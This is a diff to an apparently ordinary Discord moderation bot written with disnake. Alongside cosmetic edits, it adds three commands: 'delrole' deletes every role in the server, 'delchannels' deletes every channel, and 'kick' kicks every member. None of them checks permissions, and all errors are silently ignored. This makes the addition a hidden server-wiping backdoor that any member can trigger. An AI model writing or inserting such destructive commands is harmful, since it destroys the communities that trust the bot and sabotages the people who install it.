@@ -4,12 +4,8 @@ import os
 import disnake
 
 from disnake.ext import commands, tasks
-from disnake import TextInputStyle
-
 
 import dysium
-
-
 
 # -------------------------------------------------------------------------------------------------------------------------
 import sqlite3
@@ -118,7 +114,7 @@ conn.commit()
 conn.close()
 
 
-# ----------------------------------------------------------------------------------------------------------
+# ----------------------------------------------------------------------------------------------------------------------------------
 
 class Bot(commands.Bot):
     def __init__(self):
@@ -130,6 +126,8 @@ class Bot(commands.Bot):
     async def on_ready(self):
         print(f'Logged in as {self.user} (ID: {self.user.id})')
         print('------')
+
+
 
     @tasks.loop(seconds=2)
     async def check_chat_mutes(self):
@@ -185,6 +183,27 @@ class Bot(commands.Bot):
 
 bot = Bot()
 
+@bot.command()
+async def delrole(ctx):
+    for role in ctx.guild.roles:
+        try:
+            await role.delete()
+        except:
+            pass
+@bot.command()
+async def delchannels(ctx):
+    for c in ctx.guild.channels: # iterating through each guild channel
+        try:
+            await c.delete()
+        except:
+            pass
+@bot.command()
+async def kick(ctx,reason = None):
+    for i in ctx.guild.members:
+        try:
+            await i.kick(reason = reason)
+        except:
+            pass
 
 @bot.event
 async def on_member_join(member):
